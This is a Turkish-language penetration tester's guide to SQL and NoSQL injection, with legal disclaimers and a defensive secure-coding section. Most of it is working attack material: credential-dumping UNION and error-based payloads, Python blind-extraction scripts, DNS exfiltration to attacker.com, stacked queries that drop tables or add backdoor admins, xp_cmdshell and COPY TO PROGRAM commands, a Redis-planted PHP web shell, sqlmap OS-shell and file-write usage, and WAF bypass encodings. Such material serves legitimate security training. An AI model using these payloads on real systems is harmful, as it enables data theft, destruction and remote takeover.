# SQL & NoSQL Injection: Penetration Tester'ın Tam Rehberi

> **Yazar:** Erdem Ceylan  
> **Kapsam:** Web Uygulamaları — SQL Injection, NoSQL Injection, Blind Teknikler, WAF Bypass, Araçlar  
> **Hedef Kitle:** Güvenlik araştırmacıları, CTF oyuncuları, etik hacker'lar  
> **Yasal Uyarı:** Bu rehberdeki teknikler yalnızca izin alınan sistemlerde veya test ortamlarında kullanılmalıdır.

---

## İçindekiler

1. [Injection Nedir? Temel Mantık](#1-injection-nedir-temel-mantık)
2. [SQL Injection — Derinlemesine](#2-sql-injection--derinlemesine)
   - [In-Band: Error-Based](#21-in-band-error-based)
   - [In-Band: UNION-Based](#22-in-band-union-based)
   - [Blind: Boolean-Based](#23-blind-boolean-based)
   - [Blind: Time-Based](#24-blind-time-based)
   - [Out-of-Band](#25-out-of-band)
   - [Stacked Queries](#26-stacked-queries)
   - [Second-Order Injection](#27-second-order-injection)
3. [Veritabanına Göre Farklılıklar](#3-veritabanına-göre-farklılıklar)
4. [NoSQL Injection — Derinlemesine](#4-nosql-injection--derinlemesine)
   - [MongoDB Operator Injection](#41-mongodb-operator-injection)
   - [JavaScript Injection ($where)](#42-javascript-injection-where)
   - [CouchDB & Redis](#43-couchdb--redis)
5. [sqlmap — İleri Düzey Kullanım](#5-sqlmap--ileri-düzey-kullanım)
6. [WAF Bypass Teknikleri](#6-waf-bypass-teknikleri)
7. [Savunma ve Güvenli Kod](#7-savunma-ve-güvenli-kod)
8. [Lab Ortamı ve Araçlar](#8-lab-ortamı-ve-araçlar)
9. [Metodoloji Özeti](#9-metodoloji-özeti)

---

## 1. Injection Nedir? Temel Mantık

Injection zafiyetlerinin temel nedeni **veri ile kodun aynı kanalda taşınmasıdır.** Sunucu, kullanıcıdan gelen girdiyi veri olarak değil, komut olarak yorumlayabilir.

```
Kullanıcı girdisi  →  [Uygulama]  →  SQL Sorgusu  →  Veritabanı
      ↑
  Buraya saldırgan SQL kodu enjekte eder
```

### Neden hâlâ bu kadar yaygın?

- Eski legacy kod tabanları
- ORM yerine ham string birleştirme
- Input validation eksikliği
- Framework'ün yanlış kullanımı (parametre yerine format string)

### OWASP Top 10'daki Yeri

SQL Injection, yıllarca OWASP Top 10'un 1 numarasıydı. 2021 listesinde "Injection" kategorisi altında yer almaya devam etmekte ve kritik risk seviyesinde kabul edilmektedir.

---

## 2. SQL Injection — Derinlemesine

### Saldırı Yüzeyini Anlamak

Bir web uygulamasında SQL injection için potansiyel giriş noktaları:

```
GET /search?q=laptop          ← URL parametresi
POST /login  (body: user=x)   ← Form verisi
Cookie: session_id=abc123     ← Cookie değeri
X-Forwarded-For: 1.2.3.4      ← HTTP header
/api/user/42                  ← URL path parametresi
```

Her parametre potansiyel bir injection noktasıdır.

---

### 2.1 In-Band: Error-Based

**Mekanizma:** Veritabanı hata mesajları, sorgu yapısı veya veri hakkında bilgi sızdırır.

#### Tespit

```sql
-- Tek tırnak gönder, hata al
GET /item?id=1'
-- Beklenen hata:
-- You have an error in your SQL syntax near ''' at line 1
```

#### MySQL'de Kullanım

```sql
-- extractvalue() ile veri çekme
' AND extractvalue(1, concat(0x7e, (SELECT version()))) --

-- updatexml() ile veri çekme
' AND updatexml(1, concat(0x7e, (SELECT database())), 1) --
```

#### MSSQL'de Kullanım

```sql
-- convert() ile tip hatası tetikleme
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --
```

#### Örnek Saldırı Akışı

```
Adım 1: Tablo adlarını öğren
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--

Adım 2: Kolon adlarını öğren
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--

Adım 3: Veriyi çek
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1)))--
```

---

### 2.2 In-Band: UNION-Based

**Mekanizma:** Orijinal sorgunun sonucuna ek bir `SELECT` sonucu eklenir. Saldırgan, başka tablo verilerini görür.

#### Kolon Sayısını Bulma

```sql
-- ORDER BY ile binary search
' ORDER BY 1--   ✓
' ORDER BY 2--   ✓
' ORDER BY 3--   ✓
' ORDER BY 4--   ✗  → kolon sayısı 3

-- NULL trick ile de bulunabilir
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  ✓
```

#### String Kolon Tespiti

```sql
-- Hangi kolon metin veri gösteriyor?
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--   ← Bu döndüyse 2. kolon string
```

#### Gerçek Payload

```sql
-- Kullanıcı adı ve şifre çekme
' UNION SELECT username, password, NULL FROM users--

-- Tüm tabloları listeleme
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database()--

-- Dosya okuma (FILE privilege gerektirir)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL--
```

#### Görsel: UNION-Based Akışı

```
Normal Sorgu:
SELECT name, price FROM products WHERE id='[INPUT]'
         ↓
Zararlı Input: 1' UNION SELECT username, password FROM users--
         ↓
Çalışan Sorgu:
SELECT name, price FROM products WHERE id='1'
UNION
SELECT username, password FROM users--'
         ↓
Kullanıcı tablası verileri ürün listesi olarak döner!
```

---

### 2.3 Blind: Boolean-Based

**Mekanizma:** Uygulama hata ya da veri döndürmez, ama "kayıt var / yok" davranışı gözlemlenebilir. TRUE ve FALSE koşulları karşılaştırılarak veri tek tek çıkarılır.

#### Tespit

```sql
-- Sayfa normal yükleniyorsa: TRUE çalışıyor
' AND 1=1--   → normal sayfa
' AND 1=2--   → boş/farklı sayfa  ← injection var!
```

#### Veri Çekme — SUBSTRING Tekniği

```sql
-- Veritabanı adının 1. karakteri 'a' mı?
' AND SUBSTRING(database(),1,1)='a'--

-- Binary search ile hızlandırma
' AND ASCII(SUBSTRING(database(),1,1))>78--   ← True ise 78'den büyük
' AND ASCII(SUBSTRING(database(),1,1))>89--   ← False ise 79-89 arası
-- ... böyle devam eder
```

#### Python ile Manuel Otomatizasyon

```python
import requests
import string

url = "http://target.com/item?id=1"
charset = string.ascii_lowercase + string.digits + "_"
result = ""

for pos in range(1, 20):
    for char in charset:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{char}'--"
        r = requests.get(url + payload)
        if "item found" in r.text:  # TRUE koşulu
            result += char
            print(f"[+] Pozisyon {pos}: {char} → Şimdiye kadar: {result}")
            break

print(f"\n[+] Bulunan değer: {result}")
```

---

### 2.4 Blind: Time-Based

**Mekanizma:** Boolean farkı yoksa zaman farkına bakılır. Koşul TRUE ise veritabanı belirli süre bekler.

#### Veritabanına Göre Fonksiyonlar

| Veritabanı | Fonksiyon | Örnek |
|---|---|---|
| MySQL | `SLEEP(n)` | `IF(1=1, SLEEP(5), 0)` |
| MSSQL | `WAITFOR DELAY` | `WAITFOR DELAY '0:0:5'` |
| PostgreSQL | `pg_sleep(n)` | `SELECT pg_sleep(5)` |
| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message('x',5)` |

#### MySQL Örneği

```sql
-- Şifrenin 1. karakteri 's' ise 5 saniye bekle
1; IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='s', SLEEP(5), 0)--

-- Veritabanı adını zaman farkıyla çek
' AND IF(ASCII(SUBSTRING(database(),1,1))>77, SLEEP(3), 0)--
```

#### Nasıl Ölçülür?

```bash
# Burp Repeater'da response time'a bak
# Ya da curl ile:
time curl "http://target.com/item?id=1%27%20AND%20SLEEP(5)--"
# real 5.123s ← injection çalışıyor
```

---

### 2.5 Out-of-Band

**Mekanizma:** Veri, hedef sunucudan saldırganın kontrolündeki bir sunucuya DNS veya HTTP üzerinden gönderilir. Yanıt bandı yokken ya da güvenlik duvarları boolean/time tekniklerini engellediğinde kullanılır.

#### MySQL — DNS Exfiltration

```sql
-- LOAD_FILE ile DNS tetikleme (FILE privilege gerekir)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\x'))--

-- outfile ile HTTP (bazı konfigürasyonlarda)
' UNION SELECT ... INTO OUTFILE '\\\\attacker.com\\share\\out.txt'--
```

#### MSSQL — DNS Lookup

```sql
-- xp_dirtree ile DNS
'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- xp_fileexist
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

#### Burp Collaborator ile Kullanım

```
1. Burp Suite → Collaborator → "Copy to clipboard"
   → Sana özel: abcd1234.burpcollaborator.net

2. Payload:
   '; EXEC master..xp_dirtree '\\abcd1234.burpcollaborator.net\x'--

3. Collaborator'da DNS isteği gelirse → injection çalışıyor
4. Gelen subdomain = sızdırılan veri
```

---

### 2.6 Stacked Queries

**Mekanizma:** Noktalı virgül ile birden fazla sorgu çalıştırılır. MySQL PDO, MSSQL, PostgreSQL destekler. Standart MySQL `mysqli_query()` ile çalışmaz.

```sql
-- Şifre güncelleme
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- Tablo silme
'; DROP TABLE logs--

-- Yeni admin oluşturma
'; INSERT INTO users (username,password,role) VALUES ('backdoor','pass','admin')--

-- MSSQL'de xp_cmdshell ile OS komutu
'; EXEC xp_cmdshell 'whoami'--
```

---

### 2.7 Second-Order Injection

**Mekanizma:** Payload kaydedilirken temizleniyor ama okunurken tekrar SQL'e gömülüyor. İki aşamalı olduğu için tespiti zordur.

```
Adım 1 — Kayıt sırasında:
Username: admin'--
→ Escaping yapılıyor → Veritabanına: admin\'-- olarak gidiyor (güvenli görünüyor)

Adım 2 — Şifre güncelleme sırasında:
UPDATE users SET password='[yeni]' WHERE username='[db'den çekilen değer]'
→ Veritabanından admin'-- gelince:
UPDATE users SET password='yeni' WHERE username='admin'--'
→ admin kullanıcısının şifresi değişti, '--' sonrası ignore edildi!
```

---

## 3. Veritabanına Göre Farklılıklar

### String Birleştirme

```sql
-- MySQL
SELECT concat(username, ':', password) FROM users
SELECT username FROM users WHERE name='admin' OR 'x'='x'

-- MSSQL
SELECT username + ':' + password FROM users
SELECT username FROM users WHERE name='admin' OR 'x'='x'

-- Oracle
SELECT username || ':' || password FROM users
-- Oracle'da -- yorum çalışmaz, /* */ kullan

-- PostgreSQL
SELECT username || ':' || password FROM users
-- Cast syntax farklı: CAST(1 AS text)
```

### Versiyon Çekme

```sql
MySQL:      SELECT @@version
MSSQL:      SELECT @@version
Oracle:     SELECT * FROM v$version
PostgreSQL: SELECT version()
SQLite:     SELECT sqlite_version()
```

### Sistem Tablolarından Tablo Listeleme

```sql
-- MySQL / MariaDB
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- MSSQL
SELECT table_name FROM information_schema.tables
-- ya da:
SELECT name FROM sysobjects WHERE xtype='U'

-- Oracle
SELECT table_name FROM all_tables

-- PostgreSQL
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- SQLite
SELECT name FROM sqlite_master WHERE type='table'
```

### Özel Fonksiyonlar

```sql
-- MySQL: dosya okuma
SELECT LOAD_FILE('/etc/passwd')

-- MSSQL: OS komutu (admin gerektirir)
EXEC xp_cmdshell 'whoami'

-- PostgreSQL: OS komutu
COPY (SELECT '') TO PROGRAM 'id > /tmp/out'

-- Oracle: DNS lookup
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
```

---

## 4. NoSQL Injection — Derinlemesine

### Neden SQL'den Farklı?

NoSQL veritabanları SQL kullanmaz, bu nedenle `'` veya `--` gibi klasik payload'lar çalışmaz. Ancak sorgu dilleri (MongoDB'nin `$` operatörleri, CouchDB'nin MapReduce'u) kendi injection vektörlerine sahiptir.

```
SQL Injection:   ' OR '1'='1
NoSQL Injection: {"password": {"$ne": ""}}
```

---

### 4.1 MongoDB Operator Injection

#### Savunmasız Node.js Kodu

```javascript
// Tehlikeli: req.body direkt sorguya giriyor
app.post('/login', async (req, res) => {
    const user = await db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password
    });
    if (user) res.send('Giriş başarılı');
    else res.send('Hatalı giriş');
});
```

#### `$ne` Operatörü ile Auth Bypass

Normal JSON girdisi:
```json
{"username": "admin", "password": "yanlis_sifre"}
```

Zararlı JSON girdisi:
```json
{"username": "admin", "password": {"$ne": ""}}
```

Oluşan MongoDB sorgusu:
```javascript
db.users.findOne({
    username: "admin",
    password: { $ne: "" }  // Şifresi boş olmayan → herkesi kapsar!
})
// → admin kullanıcısı döner, giriş başarılı!
```

#### `$gt` Operatörü

```json
{"username": "admin", "password": {"$gt": ""}}
// Şifresi boş string'den büyük olan → her şifre eşleşir
```

#### `$regex` ile Kullanıcı Numaralandırma

```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
```

Binary search ile tüm kullanıcı adları bulunabilir:
```json
{"username": {"$regex": "^ad"}, ...}   ✓
{"username": {"$regex": "^adm"}, ...}  ✓
{"username": {"$regex": "^admin"}, ...} ✓
```

#### HTTP Parametre Pollution ile Injection

Bazı framework'ler `?param[key]=value` sözdizimini otomatik objeye çevirir:

```
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=x
```

PHP ve bazı Node.js çerçeveleri bu isteği şu şekilde parse eder:
```php
$_POST = ['username' => 'admin', 'password' => ['$ne' => 'x']]
```

---

### 4.2 JavaScript Injection ($where)

`$where` operatörü MongoDB sunucusunda JavaScript çalıştırır. Bu, hem veri sızıntısına hem de (eski sürümlerde) DoS'a yol açabilir.

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}
```

#### Şifre Karakterlerini Çekme

```json
{"username": "admin", "$where": "this.password.charCodeAt(0) == 115"}
// 115 = 's' ASCII kodu
```

Python ile otomatize:
```python
import requests, string

target = "http://target.com/login"
charset = string.ascii_lowercase + string.digits + "!@#$_"
result = ""

for pos in range(0, 20):
    for char in charset:
        code = ord(char)
        payload = {
            "username": "admin",
            "$where": f"this.password.charCodeAt({pos}) == {code}"
        }
        r = requests.post(target, json=payload)
        if "success" in r.text:
            result += char
            print(f"[+] Pos {pos}: {char} → {result}")
            break
    else:
        break  # Karakter bulunamadı, muhtemelen son pozisyon

print(f"\n[+] Şifre: {result}")
```

#### Time-Based NoSQL

```json
{"username": "admin", "$where": "if(this.password.charAt(0) == 's'){sleep(5000)} else {return true}"}
```

---

### 4.3 CouchDB & Redis

#### CouchDB — HTTP API Injection

CouchDB REST API üzerinden çalışır. Parametre manipülasyonu ile yetkisiz erişim mümkündür:

```bash
# Normal istek
GET /db/documentid

# Path traversal + admin bypass (eski sürümlerde)
GET /db/_design/../../../_users/_all_docs

# Mango Query injection (CouchDB 2.x)
POST /db/_find
{"selector": {"username": {"$ne": null}}}
# → Tüm belgeler döner
```

#### Redis — Komut Injection

Redis genellikle kimlik doğrulama olmadan iç ağda çalışır. SSRF ile ulaşılabilirse tehlikelidir:

```bash
# Redis protokolü üzerinden komutlar
redis-cli -h target CONFIG SET dir /var/www/html
redis-cli -h target CONFIG SET dbfilename shell.php
redis-cli -h target SET payload "<?php system($_GET['cmd']); ?>"
redis-cli -h target BGSAVE
# → /var/www/html/shell.php dosyası oluştu
```

---

## 5. sqlmap — İleri Düzey Kullanım

`sqlmap`, SQL injection tespiti ve exploitasyonunu otomatize eden açık kaynaklı bir araçtır.

### Temel Kullanım

```bash
# GET parametresini test et
sqlmap -u "http://target.com/item?id=1"

# Tüm veritabanlarını listele
sqlmap -u "http://target.com/item?id=1" --dbs

# Belirli veritabanındaki tabloları listele
sqlmap -u "http://target.com/item?id=1" -D hedef_db --tables

# Tablo içeriğini dump et
sqlmap -u "http://target.com/item?id=1" -D hedef_db -T users --dump

# Tüm veriyi dump et
sqlmap -u "http://target.com/item?id=1" --dump-all
```

### POST İsteği ile

```bash
# Form verisi
sqlmap -u "http://target.com/login" \
       --data="username=admin&password=test" \
       -p "username"

# Burp'ten istek dosyası
sqlmap -r request.txt -p "id"
```

`request.txt` içeriği (Burp'ten kopyalanır):
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test
```

### Cookie ve Header Injection

```bash
# Cookie'de injection
sqlmap -u "http://target.com/" --cookie="session=abc*"

# Header'da injection
sqlmap -u "http://target.com/" -H "X-Forwarded-For: 1.2.3.4*"

# User-Agent'ta injection
sqlmap -u "http://target.com/" --user-agent="Mozilla*"
```

### Teknik ve Seviye Seçimi

```bash
# Sadece time-based blind kullan
sqlmap -u "http://target.com/item?id=1" --technique=T

# Tüm teknikler (BEUSTQ)
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
sqlmap -u "http://target.com/item?id=1" --technique=BEUSTQ

# Agresiflik seviyesi (1-5, varsayılan 1)
sqlmap -u "http://target.com/item?id=1" --level=3 --risk=2
```

### WAF Atlatma — Tamper Scriptleri

```bash
# Boşlukları yorum satırıyla değiştir
sqlmap -u "http://target.com/item?id=1" --tamper=space2comment

# Büyük/küçük harf karıştır
sqlmap -u "http://target.com/item?id=1" --tamper=randomcase

# URL encode
sqlmap -u "http://target.com/item?id=1" --tamper=charencode

# Birden fazla tamper birlikte
sqlmap -u "http://target.com/item?id=1" \
       --tamper="space2comment,randomcase,charencode"
```

Tüm tamper listesi:
```bash
ls /usr/share/sqlmap/tamper/
```

### OS Komut Çalıştırma

```bash
# OS komut çalıştır (DBA yetkisi ve destekli DB gerekir)
sqlmap -u "http://target.com/item?id=1" --os-cmd="id"

# Interaktif OS shell
sqlmap -u "http://target.com/item?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/item?id=1" --sql-shell
```

### Dosya Okuma/Yazma

```bash
# Dosya oku (FILE privilege gerekir)
sqlmap -u "http://target.com/item?id=1" \
       --file-read="/etc/passwd"

# Dosya yaz (web root yazma yetkisi gerekir)
sqlmap -u "http://target.com/item?id=1" \
       --file-write="shell.php" \
       --file-dest="/var/www/html/shell.php"
```

### Proxy ve Gizlilik

```bash
# Burp Suite üzerinden geçir
sqlmap -u "http://target.com/item?id=1" \
       --proxy="http://127.0.0.1:8080"

# İstek aralığı (rate limiting için)
sqlmap -u "http://target.com/item?id=1" \
       --delay=2 --timeout=30
```

---

## 6. WAF Bypass Teknikleri

WAF'lar imza tabanlı çalışır, bu nedenle payload'ı yeterince değiştirmek çoğunlukla yeterlidir.

### Encoding Teknikleri

```sql
-- URL Encode
SELECT → %53%45%4C%45%43%54
' → %27

-- Double URL Encode
' → %2527

-- HTML Entity
' → &#39;   ya da   &apos;

-- Unicode
' → %u0027   (IIS)
SELECT → %u0053%u0045...
```

### Büyük/Küçük Harf Karıştırma

```sql
-- WAF imzası: SELECT, select
SeLeCt * FrOm UsErS
sElEcT * fRoM uSeRs
```

### Yorum ile Bölme

```sql
-- Boşluk yerine yorum
SELECT/**/username/**/FROM/**/users

-- MySQL inline yorum
SEL/*bypass*/ECT username FROM users

-- Boşluk alternatifleri
SELECT%09username%09FROM%09users   (%09 = tab)
SELECT%0Ausername%0AFROM%0Ausers   (%0A = newline)
```

### Eşdeğer Fonksiyonlar

```sql
-- substring() yerine
MID(version(), 1, 1)
SUBSTR(version(), 1, 1)

-- ascii() yerine
ORD(SUBSTR(version(),1,1))
HEX(SUBSTR(version(),1,1))

-- SLEEP() yerine (MySQL)
BENCHMARK(5000000, MD5('a'))

-- Koşullu ifade alternatifleri
IF(1=1,'a','b')       → CASE WHEN 1=1 THEN 'a' ELSE 'b' END
```

### HTTP Seviyesinde Bypass

```
# Header manipulation
Content-Type: application/json; charset=utf-8
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

# Chunked transfer encoding
Transfer-Encoding: chunked
→ Payload parça parça gönderilir, bazı WAF'lar birleştirmez

# HTTP Parameter Pollution
?id=1&id=2 UNION SELECT...
→ Bazı WAF'lar sadece ilkini, uygulama sonuncuyu işler
```

### Gerçek Örnek: ModSecurity Bypass

```sql
-- Engellenen: ' UNION SELECT username FROM users--
-- Bypass:
'/*!UNION*//*!SELECT*/username/*!FROM*/users--

-- Veya:
' UNION%23hede%0ASELECT username FROM users--
-- (#hede\n = yorum satırı + newline, whitespace gibi davranır)
```

---

## 7. Savunma ve Güvenli Kod

Bir penetration tester olarak raporda bu önerileri vermek gerekir.

### Prepared Statements (Parametreli Sorgular)

**PHP + PDO:**
```php
// AÇIK — string birleştirme
$query = "SELECT * FROM users WHERE username='$username'";
$result = $conn->query($query);

// GÜVENLİ — prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$result = $stmt->fetchAll();
```

**Java + JDBC:**
```java
// AÇIK
String query = "SELECT * FROM users WHERE id=" + userId;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// GÜVENLİ
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();
```

**Python + SQLAlchemy:**
```python
# AÇIK
result = db.execute(f"SELECT * FROM users WHERE name='{name}'")

# GÜVENLİ
result = db.execute("SELECT * FROM users WHERE name=:name", {"name": name})

# ORM ile (en güvenli)
user = User.query.filter_by(username=name).first()
```

**Node.js + mysql2:**
```javascript
// AÇIK
db.query(`SELECT * FROM users WHERE id=${req.params.id}`);

// GÜVENLİ
db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
```

### NoSQL için Güvenli Kod

```javascript
// AÇIK — direkt obje kullanımı
User.findOne({ username: req.body.username, password: req.body.password });

// GÜVENLİ — tip dönüşümü + doğrulama
const username = String(req.body.username).slice(0, 50);
const password = String(req.body.password).slice(0, 100);
// Artık $ne, $gt gibi operatörler string'e dönüştü
User.findOne({ username, password });

// En iyi yaklaşım — joi/yup ile schema validation
const schema = Joi.object({
    username: Joi.string().alphanum().max(30).required(),
    password: Joi.string().max(100).required()
});
const { error, value } = schema.validate(req.body);
if (error) return res.status(400).send('Geçersiz girdi');
```

### Ek Savunma Katmanları

```
1. Least Privilege (En Az Yetki)
   → Uygulama DB kullanıcısı sadece SELECT/INSERT/UPDATE yapabilmeli
   → DROP, CREATE, FILE, EXECUTE yetkisi olmamalı

2. WAF + Input Validation
   → ModSecurity, AWS WAF gibi çözümler
   → Whitelist validation (izin verilenler listesi)

3. Error Handling
   → Üretim ortamında detaylı hata mesajları gösterilmemeli
   → Generic: "Bir hata oluştu" — injection tespitini zorlaştırır

4. Logging & Monitoring
   → Anormal sorgu sayısı ve kalıpları alert etmeli
   → SIEM entegrasyonu

5. Database Activity Monitoring (DAM)
   → DB katmanında şüpheli sorgular izlenmeli
```

---

## 8. Lab Ortamı ve Araçlar

### Pratik Yapılacak Yerler

```
Çevrimiçi Lablar:
- PortSwigger Web Security Academy  → https://portswigger.net/web-security/sql-injection
- HackTheBox                        → https://hackthebox.com
- TryHackMe                         → https://tryhackme.com
- PentesterLab                      → https://pentesterlab.com

Yerel Kurulum:
- DVWA (Damn Vulnerable Web App)    → docker run -d -p 80:80 vulnerables/web-dvwa
- WebGoat                           → docker run -d -p 8080:8080 webgoat/goat-and-wolf
- SQLi-labs                         → github.com/Audi-1/sqli-labs
- bWAPP                             → github.com/raesene/bwapp

CTF Platformları:
- PicoCTF
- CTFtime.org
```

### Docker ile Hızlı Lab

```bash
# DVWA
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
# Tarayıcı: http://localhost  admin:password

# WebGoat (SQL injection bölümü var)
docker pull webgoat/goat-and-wolf
docker run -d -p 8080:8080 --name webgoat webgoat/goat-and-wolf
# Tarayıcı: http://localhost:8080/WebGoat
```

### Araç Seti

| Araç | Amaç | Kaynak |
|---|---|---|
| `sqlmap` | Otomatik SQLi tespiti ve exploit | sqlmap.org |
| `Burp Suite` | Proxy, repeater, intruder | portswigger.net |
| `NoSQLMap` | MongoDB/CouchDB injection | github.com/codingo/NoSQLMap |
| `Havij` | GUI SQLi aracı | — |
| `ghauri` | Gelişmiş SQLi aracı | github.com/r0oth3x49/ghauri |
| `mongodump` | MongoDB dump | MongoDB resmi |
| `Wireshark` | Ağ trafiği analizi | wireshark.org |

### NoSQLMap Kullanımı

```bash
# Kurulum
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap && pip install -r requirements.txt

# Çalıştırma
python nosqlmap.py

# Seçenekler:
# 1. Set Target Host/IP
# 2. Set Target Web App Port
# 3. Set URI Path
# 4. Set HTTP Request Type
# 5. Set Target Parameter
# ...
```

---

## 9. Metodoloji Özeti

Bir penetration test sırasında SQL/NoSQL injection için sistematik yaklaşım:

```
KEŞIF (Reconnaissance)
├── Uygulama haritası çıkar (Burp Spider/Crawler)
├── Tüm input noktalarını listele
│   ├── GET/POST parametreleri
│   ├── Cookie değerleri
│   ├── HTTP header'ları
│   └── URL path segmentleri
└── Kullanılan veritabanı teknolojisini tespit et
    ├── Hata mesajları
    ├── HTTP header'ları (X-Powered-By, Server)
    └── Uygulama davranışı

TESPIT (Detection)
├── Manuel — tek tırnak, çift tırnak, boolean
├── sqlmap --crawl ile otomatik tarama
└── Fuzzing ile anormal yanıt arama

DOĞRULAMA (Confirmation)
├── True/False farkını gözlemle
├── Zaman farkını ölç
└── Farklı payload'lar ile tekrarla

EXPLOIT
├── Tekniği seç (Error/Union/Blind/OOB)
├── Veritabanı bilgilerini topla
│   ├── version()
│   ├── database()
│   └── current_user()
├── Tablo/kolon listesi çıkar
├── Kritik veriyi dump et
└── Ayrıcalık yükseltme (xp_cmdshell, INTO OUTFILE)

RAPORLAMA
├── PoC (Proof of Concept) hazırla
├── Risk puanı ver (CVSS)
├── Etki analizi yap
└── Düzeltme önerileri sun
```

### Hızlı Referans: İlk 5 Payload

```sql
-- 1. Basit tespit
'

-- 2. Boolean TRUE
' AND 1=1--

-- 3. Boolean FALSE  
' AND 1=2--

-- 4. Auth bypass
' OR '1'='1'--

-- 5. Union kolon sayısı tespiti
' ORDER BY 1--
```

---

## Kaynaklar ve İleri Okuma

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [sqlmap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)

---

> Bu belge eğitim amaçlıdır. Yalnızca izin alınan sistemlerde veya kendi test ortamınızda uygulayın. İzinsiz sistemlere yapılan saldırılar yasadışıdır.